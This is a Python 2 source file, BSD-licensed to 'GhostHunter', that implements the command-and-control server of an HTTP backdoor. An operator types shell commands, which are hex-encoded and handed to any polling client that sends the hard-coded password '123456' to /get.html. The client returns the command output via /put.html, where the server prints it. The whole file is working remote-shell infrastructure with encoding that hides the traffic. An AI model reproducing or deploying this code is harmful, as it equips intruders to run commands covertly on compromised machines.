#! /usr/bin/python

# 
# Copyright (c) 2010 GhostHunter
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.


import string,cgi,time,binascii
from os import curdir, sep
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

class MyHandler(BaseHTTPRequestHandler):

    passwd="123456"
    received_pass=""
    command_response=""

    def get_parameters(self):
       key=""
       command=""
       length = int(self.headers.getheader('content-length'))
       ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))
       if ctype == 'application/x-www-form-urlencoded':
              qs = self.rfile.read(length)
              values=cgi.parse_qs(qs, keep_blank_values=1)
              try:
                     key=binascii.unhexlify(values['key'][0])
                     command=binascii.unhexlify(values['cmd'][0])
              except KeyError:
                  pass
              
              except TypeError:
                  pass
       return key, command


    def do_POST(self):
            if self.path=="/get.html":
                    self.received_pass, self.command_response=self.get_parameters()
                    if self.passwd==self.received_pass:
                            command=raw_input("Enter the command: ")
	                    output="key=%s;cmd=%s" % (binascii.hexlify(self.passwd),binascii.hexlify(command))
                            self.send_response(200)
                            self.end_headers()
                            self.wfile.write(output)
                            print "Sent command: %s" % command
                    else:
                            self.send_response(404)
                            self.end_headers()

            elif self.path=="/put.html":
                    self.received_pass, self.command_response=self.get_parameters()
                    if self.passwd==self.received_pass:
                           self.send_response(200)
                           self.end_headers()
                           print "command response:\n%s" % (self.command_response)
                    else:
                           self.send_response(404)
                           self.end_headers()

            else:
                    self.send_response(404)
                    self.end_headers()

def main():
    try:
        #server = HTTPServer(('', 8080), MyHandler)
        server = HTTPServer(('127.0.0.1', 8080), MyHandler)
        print 'started httpserver...'
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down server'
        server.socket.close()

if __name__ == '__main__':
    main()

